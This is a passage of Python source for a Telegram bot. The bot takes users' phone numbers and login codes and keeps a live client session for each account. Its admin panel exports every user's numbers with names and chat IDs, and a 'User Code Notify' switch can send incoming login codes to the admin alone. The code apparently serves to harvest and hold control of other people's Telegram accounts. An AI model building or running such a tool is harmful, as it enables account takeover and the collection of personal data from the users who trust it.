        kb.append([InlineKeyboardButton("◀️ Back", callback_data="info_back")])
        await q.edit_message_text(t(uid, "select_download"), reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

    elif data.startswith("dl_"):
        code = data.replace("dl_", "")
        user = q.from_user
        lines = [f"Name: {user.first_name or 'Unknown'}", f"Username: @{user.username or 'None'}",
                 f"Chat ID: {uid}", f"Total: {len(user_accs)}", ""]
        country_nums = {}
        for p, i in user_accs.items():
            c = i.get("country") or get_country_code(p)
            if code != "all" and c != code:
                continue
            if c not in country_nums:
                country_nums[c] = []
            country_nums[c].append(p)
        for c, nums in country_nums.items():
            lines.append(f"{get_country_name(c)} Total: {len(nums)}")
            lines.extend(nums)
            lines.append("")
        path = f"{DATA_DIR}/user_{uid}_{code}.txt"
        with open(path, "w", encoding="utf-8") as f:
            f.write("\n".join(lines))
        await q.message.reply_document(open(path, "rb"), filename=f"numbers_{code}.txt")
        await q.edit_message_text(t(uid, "file_sent"))

    elif data == "info_back":
        total = len(user_accs)
        kb = [
            [InlineKeyboardButton("📱 All Number", callback_data="info_allnum")],
            [InlineKeyboardButton("📁 Download Number File", callback_data="info_download")]
        ]
        await q.edit_message_text(t(uid, "info_menu", total=total), reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

# ====================== DASHBOARD ======================
async def dashboard(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return

    accounts = load_json(ACCOUNTS_FILE, {})
    users = load_json(USERS_FILE, {})
    total_users = len(users)
    total_numbers = len(accounts)
    admin_count = sum(1 for i in accounts.values() if i.get("uid") in get_admins())
    settings = get_settings()
    silent = "🟢 ON" if settings.get("silent", True) else "🔴 OFF"
    user_notify = "🟢 ON" if settings.get("user_code_notify", True) else "🔴 OFF"

    text = (
        f"👨‍💻 **Admin Dashboard**\n\n"
        f"👥 Total Users: `{total_users}`\n"
        f"🔢 Total Active Numbers: `{total_numbers}`\n"
        f"👑 Admin Added: `{admin_count}`\n"
        f"🔔 Silent Mode: {silent}\n"
        f"📨 User Code Notify: {user_notify}\n"
        f"🟢 Online Clients: `{len(clients)}`"
    )
    kb = [
        [InlineKeyboardButton("📢 BoardChat", callback_data="adm_bc")],
        [InlineKeyboardButton(f"🔔 Silent: {silent}", callback_data="adm_silent")],
        [InlineKeyboardButton(f"📨 User Code: {user_notify}", callback_data="adm_usernotify")],
        [InlineKeyboardButton("📁 Download All Users File", callback_data="adm_allfile")],
        [InlineKeyboardButton("🔄 Reload Clients", callback_data="adm_reload")]
    ]
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

async def admin_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    if not is_admin(q.from_user.id):
        return
    data = q.data

    if data == "adm_bc":
        context.user_data["action"] = "broadcast"
        await q.edit_message_text("📢 Send broadcast message:")

    elif data == "adm_silent":
        s = get_settings()
        s["silent"] = not s.get("silent", True)
        save_json(SETTINGS_FILE, s)
        status = "ON 🟢" if s["silent"] else "OFF 🔴"
        await q.edit_message_text(f"🔔 Silent Mode is now **{status}**")

    elif data == "adm_usernotify":
        s = get_settings()
        s["user_code_notify"] = not s.get("user_code_notify", True)
        save_json(SETTINGS_FILE, s)
        status = "ON 🟢" if s["user_code_notify"] else "OFF 🔴"
        await q.edit_message_text(
            f"📨 User Code Notify is now **{status}**\n\n"
            f"ON = User + Admin both get code\n"
            f"OFF = Only Admin gets code"
        )

    elif data == "adm_allfile":
        accounts = load_json(ACCOUNTS_FILE, {})
        users_data = {}
        for p, i in accounts.items():
            uid = i.get("uid")
            if not uid:
                continue
            if uid not in users_data:
                users_data[uid] = {"name": i.get("name", ""), "username": i.get("username", ""), "numbers": []}
            users_data[uid]["numbers"].append(p)
        lines = []
        for uid, info in users_data.items():
            lines.append(f"Name: {info['name']}")
            lines.append(f"Username: @{info['username'] or 'None'}")
            lines.append(f"Chat ID: {uid}")
            lines.append(f"Total: {len(info['numbers'])}")
            country_nums = {}
            for p in info["numbers"]:
                c = get_country_code(p)
                if c not in country_nums:
                    country_nums[c] = []
                country_nums[c].append(p)
            for c, nums in country_nums.items():
                lines.append(f"{get_country_name(c)} Total: {len(nums)}")
                lines.extend(nums)
            lines.append("\n" + "─"*30 + "\n")
        path = f"{DATA_DIR}/all_users.txt"
        with open(path, "w", encoding="utf-8") as f:
            f.write("\n".join(lines))
        await q.message.reply_document(open(path, "rb"), filename="all_users.txt")
        await q.edit_message_text("✅ File sent!")

    elif data == "adm_reload":
        loaded = 0
        for p in load_json(ACCOUNTS_FILE, {}):
            try:
                if await start_client(p):
                    loaded += 1
            except:
                pass
        await q.edit_message_text(f"✅ Reloaded `{loaded}` clients")

async def admin_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    if "action" not in context.user_data:
        return
    action = context.user_data.pop("action")
    text = update.message.text.strip()

    if action == "broadcast":
        accounts = load_json(ACCOUNTS_FILE, {})
        users = list(set(i.get("uid") for i in accounts.values() if i.get("uid")))
        ok = 0
        status = await update.message.reply_text(f"📢 Sending to {len(users)} users...")
        for u in users:
            try:
                await context.bot.send_message(u, f"📢 **Announcement**\n\n{text}", parse_mode="Markdown")
                ok += 1
            except:
                pass
        await status.edit_text(f"✅ Sent to `{ok}` users")

# ====================== MAIN ======================
async def post_init(app):
    print("🔄 Loading sessions...")
    for p in load_json(ACCOUNTS_FILE, {}):
        try:
            await start_client(p)
        except:
            pass
    print(f"✅ Ready! {len(clients)} sessions loaded.")
    asyncio.create_task(check_sessions_loop())

def main():
    app = Application.builder().token(BOT_TOKEN).post_init(post_init).build()

    conv = ConversationHandler(
        entry_points=[
            MessageHandler(
                filters.Regex(r'^\+?\d{8,15}$'),
                handle_phone
            )
        ],
        states={
            WAITING_CODE: [
                MessageHandler(
                    filters.TEXT & ~filters.COMMAND,
                    handle_code
                )
            ]
        },
        fallbacks=[
            CommandHandler("cancel", cancel)
        ],
        allow_reentry=True
    )

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("language", language_cmd))
    app.add_handler(CommandHandler("information", information))
    app.add_handler(CommandHandler("dashboard", dashboard))
    app.add_handler(CommandHandler("cancel", cancel))

    app.add_handler(conv)

    app.add_handler(
        CallbackQueryHandler(
            lang_cb,
            pattern=r"^lang_"
        )
    )

    app.add_handler(
        CallbackQueryHandler(
            info_cb,
            pattern=r"^(info_|show_|dl_)"
        )
    )

    app.add_handler(
        CallbackQueryHandler(
            admin_cb,
            pattern=r"^adm_"
        )
    )

    app.add_handler(
        MessageHandler(
            filters.TEXT & ~filters.COMMAND,
            admin_text
        )
    )

    print("🚀 Bot starting...")
    app.run_polling()


if __name__ == "__main__":
    main()
